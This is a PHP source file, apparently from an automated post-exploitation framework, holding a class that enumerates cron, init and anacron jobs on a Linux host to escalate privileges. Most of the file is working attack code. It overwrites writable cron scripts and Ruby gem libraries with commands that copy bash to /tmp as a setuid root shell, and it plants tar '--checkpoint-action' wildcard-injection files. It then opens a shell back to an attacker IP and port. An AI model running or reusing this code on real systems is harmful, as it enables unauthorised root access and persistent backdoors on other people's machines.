<?php
class check4linux8jobs extends check4linux8suid{
    
    
    public function __construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$uid,$uid_name,$gid,$gid_name,$context) {
        parent::__construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$uid,$uid_name,$gid,$gid_name,$context);
    }

    public function jobs(){
        $result = "";
        $this->titre(__FUNCTION__);
        $minute = array();$hour = array();$day = array();$month = array();$day8week = array();
        $user = array();$exec_file = array();
        
        // https://www.hackingarticles.in/linux-privilege-escalation-by-exploiting-cron-jobs/

        
        $data = "ls -lart /etc/rc.d/";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "cat ~/.bashrc  | grep -v '^#' | sort -u 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $this->note("init.d files NOT belonging to root!");
        $data = "find /etc/rc.d/init.d \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $this->note("anything 'useful' in inetd.conf");
        $data = "awk '{print $7}' /etc/inetd.conf 2>/dev/null |xargs -r ls -la 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        $this->note("systemd files not belonging to root");
        $data = "find /lib/systemd/ \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        $this->note("upstart scripts not belonging to root");
        $data = "find /etc/init \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        $this->note("rc.d files NOT belonging to root!");
        $data = "find /usr/local/etc/rc.d \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        $data = "ps aux | grep -i schedule";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $this->note("contab contents");
        $data = "cat -v /etc/crontab | grep -v -e '^$' | grep -v '^#' 2>/dev/null";
        $contab_contents = $this->lan2stream4result($data,$this->stream_timeout);

        
        $result_tmp = array();
        $this->note("contab jobs infos");
        
        list($minute,$hour,$day,$month,$day8week,$user,$exec_file) = $this->parse4crontab($contab_contents);
        $this->pause();

        $size = count($exec_file);
        for($i=0;$i<$size;$i++){
            $job_filepath = $exec_file[$i];
            $data = "ls -la $job_filepath 2>/dev/null";
            $this->lan2stream4result($data,$this->stream_timeout);
            if (!$this->ip2root8db($this->ip2id)) $this->jobs8file2backdoor($minute[$i],$hour[$i],$day[$i],$month[$i],$day8week[$i],$user[$i],$exec_file[$i]);
        }
        $this->pause();

        
        $this->note("are there any cron jobs configured");
        $data = "ls -la /etc/cron* 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        $this->note("can we manipulate these jobs in any way
World-writable cron jobs and file contents:");
        $data = "find /etc/cron* -perm -0002 -type f -exec ls -la {} -exec cat -v {} 2>/dev/null \;";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        
        
        $this->note("Anything interesting in /var/spool/cron/crontabs:");
        $data = "ls -la /var/spool/cron/crontabs 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);

        
        $this->note("Anacron jobs and associated file permissions:");
        $data = "ls -la /etc/anacrontab 2>/dev/null; grep -v -e '^$' /etc/anacrontab 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $this->note("When were jobs last executed (/var/spool/anacron contents):");
        $data = "ls -la /var/spool/anacron 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);

        
        $this->note("pull out account names from /etc/passwd and see if any users have associated cronjobs (priv command)");
        $data = "cut -d ':' -f 1 /etc/passwd | xargs -n1 crontab -l -u 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);

        
        
        $data = "cat \$(ls /var/spool/cron/crontabs/*) 2> /dev/null  ";
        $lines = $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "cat \$(ls /var/spool/cron/*) 2> /dev/null";
        $lines = $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "cat  /etc/inetd.conf | grep -v '^#' | sort -u 2>/dev/null";
        $lines = $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "/bin/ls -alR /etc/cron.d/";
        $lines = $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "crontab -l | grep -v '^#' | sort -u 2>/dev/null";
        $lines = $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "ls -al /etc/cron*";
        $lines = $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "grep -v -e '^$' /etc/at.*  | grep -v '^#' | sort -u 2>/dev/null";
        $lines = $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "cat /var/spool/cron/crontabs/root  | grep -v '^#' | sort -u 2>/dev/null";
        $lines = $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "ls -al /etc/ | grep cron";
        $lines = $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "ls -alh /var/spool/cron";
        $lines = $this->lan2stream4result($data,$this->stream_timeout);
        
        
        
        $data = "crontab -l | grep -v \"^#\"  ";
        $process_lists = $this->lan2stream4result($data,$this->stream_timeout);
        $lines = explode("\n", $process_lists);
        foreach ($lines as $line){
            if(!empty($line)){
                $this->article("Jobs", $line);
            }
            
        }
        
        return $result ;
    }

    
    
    
    public function jobs8file2backdoor($minute,$hour,$day,$month,$day8week,$user,$lan_filepath){
        $result = "";
        $this->ssTitre(__FUNCTION__);
        $lan_filepath = trim($lan_filepath);
        $obj_jobs = new FILE($lan_filepath);
        
        $data = "file $obj_jobs->file_path";
        $file_info = $this->lan2stream4result($data,$this->stream_timeout);
        // if ($this->lan2file4writable($obj_jobs->file_path)){
        
        
        switch ($file_info) {
            case (strstr($file_info,"Bourne-Again shell script, ASCII text executable")!==FALSE) :
                $this->jobs8file2backdoor4ascii4bash($minute,$hour,$day,$month,$day8week,$user,$lan_filepath);
                $this->jobs8file2backdoor4ascii4tar($minute,$hour,$day,$month,$day8week,$user,$lan_filepath);
              break;
                
              
            case (strstr($file_info,"Ruby script, ASCII text executable")!==FALSE) :
                $this->jobs8file2backdoor4ruby($minute,$hour,$day,$month,$day8week,$user,$lan_filepath);
                break;

                
            case (strstr($file_info,"ASCII text")!==FALSE) :
                $this->jobs8file2backdoor4ascii4bash($minute,$hour,$day,$month,$day8week,$user,$lan_filepath);
                break;
                
            default:
                break;
        }
        //    }
        
        
        
        
        
        return $result;
    }
    
    public function jobs8file2backdoor4ruby($minute,$hour,$day,$month,$day8week,$user,$lan_filepath){
        $result = "";
        $this->ssTitre(__FUNCTION__);
        $obj_jobs = new FILE($lan_filepath);
        $data = "cat $obj_jobs->file_path | grep -i require ";
        $source_code = $this->lan2stream4result($data,$this->stream_timeout);
        $query = "echo \"$source_code\" | grep -i require | awk '{print $2}' | grep -Po \"[0-9a-z\_\-/]{1,}\" ";
        $libs = array();
        exec($query,$libs);

        //$libs = array("zip");
        
        foreach ($libs as $lib){
            $lib = trim($lib);
            if (!empty($lib)){
                $hashname = sha1($lib);
                
              $data = "gem which $lib  | grep '/'";
              $rst_tmp = $this->lan2stream4result($data,$this->stream_timeout);
              $query = "echo \"".addslashes($rst_tmp)."\" | grep '/' | grep -Po \"^/[[:print:]]{1,}\" ";
              $tmp = array();
              exec($query,$tmp);
              $lib_path = $tmp[0];
              
              $this->article("LIB", $lib);
              $this->article("LIB PATH", $lib_path);
              //var_dump($tmp);fgets(STDIN);
              $this->pause();
              
              $data = "ls -al $lib_path";
              $this->lan2stream4result($data,$this->stream_timeout);
              $data = "chmod 777 $lib_path";
              $this->lan2stream4result($data,$this->stream_timeout);
              $data = "ls -al $lib_path";
              $this->lan2stream4result($data,$this->stream_timeout);
              $data = "ls -al /tmp/";
              $this->lan2stream4result($data,$this->stream_timeout);
              $data = "echo '`cp /bin/bash /tmp/$hashname && chmod 6755 /tmp/$hashname`' > $lib_path";
              //$data = "echo '$(cp /bin/bash /tmp/$hashname && chmod 6755 /tmp/$hashname)' > $lib_path";
              $this->lan2stream4result($data,$this->stream_timeout);
              if (strstr($minute, "*")) $seconds = "60";
              else $seconds = $minute;
              $this->article("Wait Seconds", $seconds);
              
              sleep($seconds);
              $this->pause();
             
              $data = "ls -al /tmp/";
              $this->lan2stream4result($data,$this->stream_timeout);
              $data = "ls -al /tmp/$hashname";
              $this->lan2stream4result($data,$this->stream_timeout);
              $data = "/tmp/$hashname -p -c id";
              $rst_id = $this->lan2stream4result($data,$this->stream_timeout);
              $this->pause();
              if (strstr($rst_id, "euid=")) {
              $template_id = "/tmp/$hashname -p -c %ID%";
              $templateB64_id = base64_encode($template_id);
              $template_id_new = $this->lan2spawn2shell8euid($template_id);
              
              $attacker_ip = $this->ip4addr4target($this->ip);
              $attacker_port = rand(1024,65535);
              //$attacker_port = 7777;
              $shell = "/bin/bash";
              $this->lan2pentest8id($template_id_new,$attacker_ip,$attacker_port,$shell);

              }

             
              
               }
        }
 }
   
 public function jobs8file2backdoor4ascii4tar($minute,$hour,$day,$month,$day8week,$user,$lan_filepath){
     $result = "";
     $this->ssTitre(__FUNCTION__);
     $lan_filepath = trim($lan_filepath);
     $obj_jobs = new FILE($lan_filepath);
     
     $data = "file $obj_jobs->file_path";
     $this->lan2stream4result($data,$this->stream_timeout);
     // if ($this->lan2file4writable($obj_jobs->file_path)){
     $query = " | strings | grep \"tar\" | grep -Po \"tar \"";
     $check = $this->lan2stream4result("cat $obj_jobs->file_path $query ",$this->stream_timeout);
     $check_tar = exec("echo '$check' $query ");
     
     if (!empty($check_tar)){
         $sha1_hash = sha1($obj_jobs->file_path);
         $template_id_test = "echo  \"%ID%\" > /tmp/$sha1_hash.sh && echo \"\" > \"--checkpoint-action=exec=sh /tmp/$sha1_hash.sh\" && echo \"\" > --checkpoint=1";
         $attacker_ip = $this->ip4addr4target($this->ip);
         $attacker_port = rand(1024,65535);
         //$attacker_port = 7777;
         $shell = "/bin/bash";
         $this->lan2pentest8id($template_id_test,$attacker_ip,$attacker_port,$shell);
         $this->pause();
     }
 }
    
 public function jobs8file2backdoor4ascii4bash($minute,$hour,$day,$month,$day8week,$user,$lan_filepath){
        $this->ssTitre(__FUNCTION__);
        $lan_filepath = trim($lan_filepath);
        $obj_jobs = new FILE($lan_filepath);
        
        $data = "file $obj_jobs->file_path";
        $this->lan2stream4result($data,$this->stream_timeout);
       
        $this->lan2stream4result("cat $obj_jobs->file_path",$this->stream_timeout);

        $sha1_hash = sha1($obj_jobs->file_path);
        
        $cmd_lib = "cp /bin/bash /tmp/bash && chmod 6777 /tmp/bash && /tmp/bash -p -c /usr/bin/id";
        $cmd_lib = "/bin/bash -p -c /usr/bin/id";
        
        $data = "echo \"cp /bin/bash /tmp/$sha1_hash && chmod 6777 /tmp/$sha1_hash\" > $obj_jobs->file_path ";
        $this->lan2stream4result($data,$this->stream_timeout);
        //sleep($minute*60);
        $data = "ls -al /tmp/$sha1_hash ";
        $this->lan2stream4result($data,$this->stream_timeout);
        $template_id_test = "/tmp/$sha1_hash -p -c id";
        $attacker_ip = $this->ip4addr4target($this->ip);
        $attacker_port = rand(1024,65535);
        //$attacker_port = 7777;
        $shell = "/bin/bash";
        $this->lan2pentest8id($template_id_test,$attacker_ip,$attacker_port,$shell);
        $this->pause();
    }
    
    
    
}
?>